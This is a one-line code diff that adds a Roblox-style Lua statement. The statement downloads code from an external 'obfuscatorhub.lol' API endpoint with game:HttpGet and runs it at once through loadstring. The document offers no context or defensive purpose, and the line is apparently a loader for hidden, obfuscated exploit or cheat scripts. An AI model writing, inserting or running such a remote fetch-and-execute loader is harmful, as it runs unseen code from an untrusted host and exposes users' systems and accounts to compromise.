@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://obfuscatorhub.lol/api/FhnvcRSO"))()
